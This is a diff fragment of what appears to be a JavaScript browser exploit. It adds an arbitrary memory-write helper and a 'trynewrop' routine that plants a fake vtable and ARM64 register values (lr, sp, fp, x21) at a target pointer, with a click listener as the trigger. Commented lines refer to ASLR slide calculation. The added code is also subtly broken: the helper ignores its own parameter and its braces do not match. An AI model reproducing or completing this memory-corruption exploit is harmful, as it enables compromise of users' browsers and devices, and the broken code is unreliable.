@@ -472,6 +472,12 @@ function foo(obj) {
                 }
                 return arr;
             },
+            write_non_zero: function(where,what) {
+                for (var i = 0; i < values.length; ++i) {
+                    if (values[i] != 0) {
+                        this.write_i64(where + i*8,0,values[i])
+                }
+            }
             readInt64: function(addrObj) {
                 //var offset = 0;
                 //var writer = this.create_writer(addrObj);
@@ -508,6 +514,23 @@ function foo(obj) {
         //log('anchor' + anchor)
         var hdr = Sub(anchor, anchor.lo() & 0xfff);
         var b = [];
+        function trynewrop() {
+         
+
+    memory.write_non_zero(exe_ptr, [
+        0x4141414141, // fake vtable
+        0,
+        0x4242424242, // x21
+        0, 0, 0, 0, 0, 0, 0,
+        0, // fp
+
+        0x313131313131, // lr
+        0,
+        0x5151515151, // sp
+    ])
+        }
+        trynewrop();
+        wrapper.addEventListener('click', function(){})
         //var vtab = 0x1B205A808;
         //var nslide = Sub(v_tlb, vtab); 
         //var slide = Sub(nslide, new Int64('0x10'));
